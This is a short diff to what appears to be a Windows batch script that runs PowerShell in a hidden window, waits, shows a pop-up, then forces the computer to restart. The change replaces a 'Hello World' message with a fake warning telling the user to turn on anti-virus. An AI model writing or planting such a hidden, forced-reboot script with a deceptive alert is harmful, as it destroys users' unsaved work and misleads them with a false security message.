@@ -3,6 +3,6 @@
 powershell -WindowStyle Hidden -Command ^
 Start-Sleep -Seconds 110; ^
 Add-Type -AssemblyName PresentationFramework; ^
-[System.Windows.MessageBox]::Show('Hello World','Restart Alert'); ^
+[System.Windows.MessageBox]::Show('turn on anti-virus your pc is restarting','Warning Alert'); ^
 Start-Sleep -Seconds 10; ^
 Restart-Computer -Force
